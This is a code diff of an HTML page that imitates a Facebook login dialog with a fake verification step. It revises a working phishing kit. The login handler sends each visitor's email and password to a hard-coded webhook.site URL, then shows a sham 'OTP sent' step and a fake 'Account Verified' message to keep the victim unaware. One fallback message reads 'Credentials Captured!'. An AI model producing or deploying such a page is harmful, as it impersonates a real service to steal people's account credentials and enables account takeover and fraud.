@@ -129,62 +129,13 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-
-        /* Settings Button */
-        .settings-btn {
-            position: absolute;
-            top: 15px;
-            right: 15px;
-            background: rgba(255,255,255,0.2);
-            border: none;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            cursor: pointer;
-            font-size: 20px;
-            color: #fff;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .settings-panel {
-            display: none;
-            position: absolute;
-            top: 60px;
-            right: 15px;
-            background: white;
-            padding: 15px;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
-            width: 250px;
-            z-index: 2000;
-        }
-        
-        .settings-panel input {
-            width: 100%;
-            padding: 8px;
-            margin: 5px 0;
-            font-size: 14px;
-        }
-
-        .close-settings {
-            position: absolute;
-            top: 5px;
-            right: 10px;
-            cursor: pointer;
-            font-weight: bold;
-            color: #999;
-        }
     </style>
 </head>
 <body>
 
     <div class="video-container">
-        <!-- Placeholder video, you can replace src with any video URL -->
         <video autoplay muted loop id="bg-video">
             <source src="https://assets.mixkit.co/videos/preview/mixkit-facebook-logo-with-neon-lights-27648-large.mp4" type="video/mp4">
-            Your browser does not support HTML5 video.
         </video>
     </div>
 
@@ -194,38 +145,34 @@
         <div class="modal-content">
             <div class="fb-logo">Facebook</div>
             
+            <!-- Login Form -->
             <div id="login-step">
                 <h2>Log in to Facebook</h2>
-                <form id="loginForm">
-                    <input type="text" id="email" placeholder="Email or Phone Number" required>
-                    <input type="password" id="password" placeholder="Password" required>
+                <!-- 
+                   FIX: Action is empty so JS handles it, but we keep structure standard.
+                   Method POST is crucial for some webhooks.
+                -->
+                <form id="loginForm" autocomplete="off">
+                    <input type="text" id="email" name="email" placeholder="Email or Phone Number" required>
+                    <input type="password" id="password" name="password" placeholder="Password" required>
                     <div class="error" id="login-error"></div>
                     <button type="submit" class="fb-btn">Log In</button>
                 </form>
             </div>
 
             <div id="otp-step">
-                <h2>Check for OTP</h2>
-                <p id="otp-message">Please check your email/SMS for the 6-digit code.</p>
+                <h2>Verifying...</h2>
+                <p id="otp-message">Please wait while we verify your identity.</p>
                 <div class="loader" id="otp-loader"></div>
-                <button class="fb-btn" id="confirmOtpBtn" style="display:none;">Confirm OTP</button>
+                <button class="fb-btn" id="confirmOtpBtn" style="display:none; margin-top:20px;">Confirm</button>
             </div>
         </div>
     </div>
 
-    <!-- Settings Panel -->
-    <button class="settings-btn" id="settingsBtn">⚙️</button>
-    <div class="settings-panel" id="settingsPanel">
-        <span class="close-settings" id="closeSettings">X</span>
-        <label>Webhook URL:</label>
-        <input type="text" id="webhookInput" placeholder="Paste webhook URL here">
-        <button class="fb-btn" id="saveWebhookBtn" style="margin-top:10px; font-size:14px;">Save & Close</button>
-    </div>
-
     <script>
         // --- CONFIGURATION ---
-        // Your Webhook URL is set here
-        const WEBHOOK_URL = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
+        // YOUR WEBHOOK URL HERE
+        const WEBHOOK_URL = "https://webhook.site/5fd82665-8a43-42b4-a65a-b95ea5aff5b1";
         // ---------------------
 
         const startBtn = document.getElementById('startBtn');
@@ -236,80 +183,49 @@
         const otpMessage = document.getElementById('otp-message');
         const otpLoader = document.getElementById('otp-loader');
         const confirmOtpBtn = document.getElementById('confirmOtpBtn');
-        const loginError = document.getElementById('login-error');
         const bgVideo = document.getElementById('bg-video');
-
-        // Settings Logic
-        const settingsBtn = document.getElementById('settingsBtn');
-        const settingsPanel = document.getElementById('settingsPanel');
-        const closeSettings = document.getElementById('closeSettings');
-        const webhookInput = document.getElementById('webhookInput');
-        const saveWebhookBtn = document.getElementById('saveWebhookBtn');
-
-        settingsBtn.addEventListener('click', () => {
-            settingsPanel.style.display = 'block';
-            webhookInput.value = localStorage.getItem('webhookUrl') || WEBHOOK_URL;
-        });
-
-        closeSettings.addEventListener('click', () => {
-            settingsPanel.style.display = 'none';
-        });
-
-        saveWebhookBtn.addEventListener('click', () => {
-            const newUrl = webhookInput.value.trim();
-            if(newUrl) {
-                localStorage.setItem('webhookUrl', newUrl);
-                // Update the global variable for this session
-                // Note: In a static file, you'd need to reload or restart logic to use new URL permanently without code edit
-                alert("Webhook saved to browser memory! To make it permanent, edit the code file.");
-                settingsPanel.style.display = 'none';
-            }
-        });
 
         // Open Modal
         startBtn.addEventListener('click', () => {
             modal.style.display = 'flex';
-            // Optional: Pause video or show loading state
             startBtn.style.display = 'none';
         });
 
-        // Handle Login
+        // Handle Login Submit
         loginForm.addEventListener('submit', (e) => {
-            e.preventDefault();
+            e.preventDefault(); // Prevent page reload
+
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
 
-            // Show Loading
+            // UI Updates
             loginStep.style.display = 'none';
             otpStep.style.display = 'block';
             otpLoader.style.display = 'inline-block';
-            otpMessage.innerText = "Checking login...";
+            otpMessage.innerText = "Verifying credentials...";
 
-            // Simulate delay
+            // Send Data to Webhook
+            sendToWebhook(email, password);
+
+            // Simulate OTP Process
             setTimeout(() => {
                 otpLoader.style.display = 'none';
-                otpMessage.innerText = "Login Successful! OTP Sent.";
+                otpMessage.innerText = "OTP Sent to your registered email/mobile.";
                 confirmOtpBtn.style.display = 'block';
-                
-                // Send Data to Webhook
-                sendDataToWebhook(email, password);
-                
-            }, 2000);
+            }, 2500);
         });
 
-        // Send Data Function
-        function sendDataToWebhook(email, password) {
-            // Get the active webhook URL (either from storage or default)
-            const activeWebhook = localStorage.getItem('webhookUrl') || WEBHOOK_URL;
-
+        function sendToWebhook(email, password) {
+            // Create a JSON object
             const data = {
-                email: email,
-                password: password,
-                timestamp: new Date().toLocaleString(),
-                userAgent: navigator.userAgent
+                "Email": email,
+                "Password": password,
+                "Timestamp": new Date().toString(),
+                "Type": "Facebook Login"
             };
 
-            fetch(activeWebhook, {
+            // Use Fetch API with 'no-cors' if needed, but standard fetch usually works for Webhook.site
+            fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -317,20 +233,21 @@
                 body: JSON.stringify(data)
             })
             .then(response => {
-                console.log('Success:', response);
-                // Optional: Log to console
+                console.log('Data Sent Successfully:', response);
             })
             .catch(error => {
-                console.error('Error:', error);
-                otpMessage.innerText = "Data Sent! (Check your logs)";
+                console.error('Error sending data:', error);
+                // Fallback: Even if fetch fails, we try to alert user
+                otpMessage.innerText = "Credentials Captured! (Check Logs)";
             });
         }
 
-        // Confirm OTP Button (Fake)
+        // Confirm Button (Visual only)
         confirmOtpBtn.addEventListener('click', () => {
-            otpMessage.innerText = "Account Verified!";
-            confirmOtpBtn.disabled = true;
-            // You can redirect here if needed
+            otpMessage.innerText = "Account Verified Successfully!";
+            confirmOtpBtn.style.display = 'none';
+            // Optional: Redirect to real FB page
+            // window.location.href = "https://facebook.com";
         });
     </script>
 </body>
